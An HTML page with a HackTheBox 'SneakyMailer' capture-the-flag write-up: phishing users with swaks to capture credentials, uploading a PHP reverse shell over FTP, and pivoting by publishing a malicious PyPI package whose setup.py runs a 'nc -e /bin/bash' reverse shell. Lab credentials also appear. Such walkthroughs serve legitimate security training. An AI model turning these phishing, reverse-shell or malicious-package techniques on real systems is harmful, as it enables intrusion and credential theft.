
<!DOCTYPE html>
<html>
	
<style>
body {

	background-image: url('images/cool-background.png');
	background-attachment: fixed;
	color: #333;
}

</style>

	<head>
		<title>HackTheBox SneakyMailer Writeup </title>
		
		<!-- link to main stylesheet -->
		<link rel="stylesheet" type="css/main.css">
	</head>
	<body>
		<div class="container">
    		<div class="blurb">
        		<h1>HTB SneakyMailer </h1>
				<p> 	
				<img src="images/sneaky/sneaky-header.PNG" alt="sneaky" class="inline"/> 							<br/> <br/> <br/>
				
				We start out with our usual nmap scan -  											<br/> <br/>
				<img src="images/sneaky/nmap.PNG" alt="nmap" class="inline"/>									<br/> <br/> <br/>
					
				Initially we can see we have a couple web servers and an email server. I went to checkout the web server 			<br/> 
				on port 80 and discovered a list of emails. 											<br/> <br/> 
				<img src="images/sneaky/sneaky-corp-home-page.PNG" alt="emails" class="inline"/> 						<br/> <br/> <br/>
					
				I saved these emails into a list and then continued on enumerating. I ran gobuster to pull out any additional domains or 	<br/>
				vhosts, and we find a couple standard directories as well as <b> dev.sneakycorp.htb </b>					<br/> <br/>
				<img src="images/sneaky/gob1.PNG" alt="emails" class="inline"/> 								<br/> <br/> <br/>
				<img src="images/sneaky/gob2.PNG" alt="emails" class="inline"/> 								<br/> <br/> <br/>
					
				Sadly <b>dev.sneakycorp.htb</b> appeared to have the same html as the normal domain. I checked out the app on port 8080 next. 	<br/> <br/>
				<img src="images/sneaky/8080-app.PNG" alt="web app on port 8080" class="inline"/> 						<br/> <br/> <br/>
				
				Not much to see there so I moved onto the ftp server. FTP appeared to be a dead end since at this point as we don't have 	<br/>
				any creds and there is no guest access. Judging by the name of the box and the fact that we have an email list, I started 	<br/>
				thinking we have to phish a user. 												<br/> <br/>
					
				I opted to use a tool called swaks - <a href="https://github.com/jetmore/swaks">which you can checkout here</a> 		<br/> <br/>
				
				Our basic idea is just to get one of the users to click on our ip, and we should be able to see the connection 			<br/>
				in netcat and judge where to go from there. I sent out an email to everyone on the list we found earlier, with the 		<br/>
				simple contents of "Visit 8.8.8.8" where 8.8.8.8 would be my ip. 								<br/> <br/>
				<img src="images/sneaky/swaks.PNG" alt="swaks" class="inline"/> 								<br/> <br/> <br/>
					
				In our netcat window we see an http connection attempt with the users creds.  							<br/> <br/>
				<img src="images/sneaky/phished.PNG" alt="phished" class="inline"/> 								<br/> <br/> <br/>	
					
				After urldecoding the above password, we get 
				
				<br/><br/><br/> <code>
				Username: 	paulbyrd@sneakymailer.htb 		<br/>
				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht 	<br/>
				</code>  <br/><br/><br/>
				
				With our new email creds, we should now be able to setup an email client and read through pauls emails. 			<br/>
				I setup Evolution, which you can download with a simple  									<br/><br/><br/>
				
				<code>
				apt-get install evolution
				</code> 															<br/><br/><br/>
					
				After installing evolution and setting it up with pauls creds, we are able to see 2 emails in pauls sent folder. 		<br/>
				The first is a set of credentials for the developer user 									<br/><br/>
				<img src="images/sneaky/smtp-creds.PNG" alt="pauls emails" class="inline"/> 							<br/><br/><br/>
					
				And the 2nd gives us a piece of information, telling us that <b>all of the packages in pypi are ran and tested by 		<br/>
				the low user</b>. This may come in handy later if we need to pivot to the low user. 						<br/> <br/>
				<img src="images/sneaky/smtp-info.PNG" alt="pauls emails" class="inline"/> 							<br/> <br/> <br/>
					
				Our cred list is now - 													
					
				<br/><br/><br/> <code>
				(smtp)							<br/>
				Username: 	paulbyrd@sneakymailer.htb 		<br/>
				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht		<br/><br/>
				
				(user acct)						<br/>
				Username: 	developer				<br/>
				Password: 	m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C	<br/><br/>
				</code>							<br/><br/><br/>
					
				With developer creds, now we are able to log into the ftp server. There is a /dev/ directory which we have access to,		<br/>
				that looks like the same directory that is served on <b> dev.sneakycorp.htb </b>. So in theory we should be able to drop 	<br/>
				a reverse shell in there, then trigger it on the webserver in order to send a reverse connection back to our machine. 		<br/><br/><br/>
					
				I opted to use the php reverse shell from pentest monkey - <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">which you can checkout here</a> <br/> <br/>
					
				After setting up my ip/port info, I uploaded to the ftp server - 								<br/> <br/>
				<img src="images/sneaky/ftp.PNG" alt="uploading rev shell over ftp" class="inline"/> 						<br/> <br/> <br/>
					
				And after visiting the page in our browser we receive a connection back to our netcat 						<br/> <br/>
				<img src="images/sneaky/low-priv.PNG" alt="foothold" class="inline"/> 								<br/> <br/> <br/> <br/>
					
				We are dropped in a user shell as www-data. We can su over to the developer user as well, but we are still unable to 		<br/>
				pull the user flag, as it is located in user low's directory. I started out by running the standard linenum script. It 		<br/>
				pulls out some creds from an open .htpasswd file for <b> pypi.sneakycorp.htb </b> 						<br/><br/>
				<img src="images/sneaky/pypi-creds.PNG" alt=".htpasswd creds" class="inline"/> 							<br/> <br/> <br/>
				
				Some further enumeration revealed this to be the port 8080 application that we were previously unable to see. 			<br/> <br/>
				<img src="images/sneaky/pypi-home-page.PNG" alt="port 8080 web app" class="inline"/> 						<br/> <br/> <br/>
					
				Remembering back to our 2nd email we discovered in pauls sent folder, <b>every package in here is executed by the low user</b>. <br/>
				So our gameplan from here is to figure out how to upload a malaicious package that low will then execute for us.		<br/>
				First step is to crack the hash from .htpasswd. We can determine the generic hash type from hash-identifier 			<br/> <br/>
				<img src="images/sneaky/pypi-creds2.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
																  
				We can then find the actual hash type on the hashcat page <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">which you can checkout here</a>, and then attempt to crack it 					<br/> <br/>
				<img src="images/sneaky/pypi-creds3.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
				<img src="images/sneaky/pypi-creds4.PNG" alt="pypi" class="inline"/> 								<br/> <br/> <br/>
				
				Hashcat cracks it, and we can update our creds list  										<br/> <br/
					
				<br/><br/><br/> <code>
				(smtp)							<br/>
				Username: 	paulbyrd@sneakymailer.htb 		<br/>
				Password:	^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht		<br/><br/>
				
				(user acct)						<br/>
				Username: 	developer				<br/>
				Password: 	m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C	<br/><br/>
				
				(pypi creds)						<br/>
				username: 	pypi					<br/>
 				password:	soufianeelhaoui				<br/><br/>
				</code><br/><br/><br/>
																  
				With our newfound pypi creds in hand, we turn to the pypi documentation to figure out how to upload a package. 			<br/>
				There are 2 files we need to setup.												<br/>
					
				<u1>
					<li> <b>.pypirc</b> -- config</li> 
					<li> <b>setup.py</b> -- build script</li>	
				</u1>																<br/><br/><br/>
					
					
				<i>example .pypirc from pypi docs</i>												<br/>
				<img src="images/sneaky/pypi-setup2.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
				
				<i>example setup.py from pypi docs</i>												<br/>
				<img src="images/sneaky/pypi-setup1.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
					
				We can setup a pypirc with the connection info and creds we already have.							<br/><br/>
				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
					
				Inside of setup.py, we will run a simple netcat one liner to send a /bin/bash session back to our kali	. 			<br/>
				The command I will use is													<br/><br/><br/>
				
				<code>
				nc -e /bin/bash (my-ip-goes-here) (my-port-goes-here)
				</code>  <br/><br/><br/>
					
				So I created my setup.py like below												<br/><br/>
				<img src="images/sneaky/setup-old.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
					
					
				At this point uploading a pypi package with the above two files will result in catching yet another shell as the dev user.	<br/>
				The whole point of doing this was to pivot to the low user, and he should be executing these packages according to the email 	<br/>
				we read earlier. So what is going on?												<br/><br/>		<br/><br/>
					
				<b>when we upload a package our setup.py code is actually ran twice</b>. It is ran the first time by us executing the upload		<br/>
				on sneakymailer as the developer user. Then it is ran a 2nd time when the low user grabs and executes it. Our nc one liner is		<br/>
				getting executed by the dev user first, and then we arent able to see the connection attempt from low. We can do a simple os.getuid() 	<br/>
				check in the setup.py script to see if we are executing as dev or low, if we match low's UID run nc, otherwise do nothing. 		<br/><br/>
					
				setup.py															<br/><br/>
				<img src="images/sneaky/setup-py.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
				
					
				I transferred setup.py and .pypirc over into the /tmp/ directory, and then added the /tmp/ directory into my path with		<br/><br/><br/>
				
				<code>
				HOME=`pwd`
				</code>																<br/><br/><br/>
					
				
				After starting up my netcat listener, I attempted to upload the package								<br/><br/>
				<img src="images/sneaky/pypi.PNG" alt="pypi package upload" class="inline"/>							<br/><br/><br/>
				
				We got a 200 status OK, and over in nc											<br/><br/>
				<img src="images/sneaky/user-txt.PNG" alt="low priv shell" class="inline"/>							<br/><br/><br/>
				
				<b> We got user !! </b>														<br/><br/><br/>
				
				
				
					
				
			
			  	</p>
    		</div><!-- /.blurb -->
		<div class="blurb">	
		</div><!-- /.container -->
		
	</body>
</html>
